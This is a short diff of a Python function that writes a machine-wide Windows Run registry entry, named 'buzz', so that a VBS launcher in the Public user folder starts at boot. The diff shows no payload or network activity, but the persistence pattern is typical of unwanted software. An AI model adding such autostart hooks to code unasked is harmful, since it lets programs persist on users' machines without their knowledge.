@@ -1,10 +1,12 @@
-import winreg, os
+import winreg
 
-# Get all mounted devices (connected or not)
 def boot():
+    '''
+    Crée une clé de registre pour lancer le programme au demarrage de Windows
+    '''
     reg = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)
     key = winreg.CreateKey(reg, 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run')
-    current_dir = os.path.dirname(os.path.realpath('__file__')) + '\\' + 'thread.exe'
+    current_dir = 'C:\\Users\\Public\\build\\exe.win-amd64-3.6\\scripts\\launch_thread.vbs'
     winreg.SetValueEx(key, 'buzz', 0, winreg.REG_SZ, current_dir)
     winreg.CloseKey(reg)
 
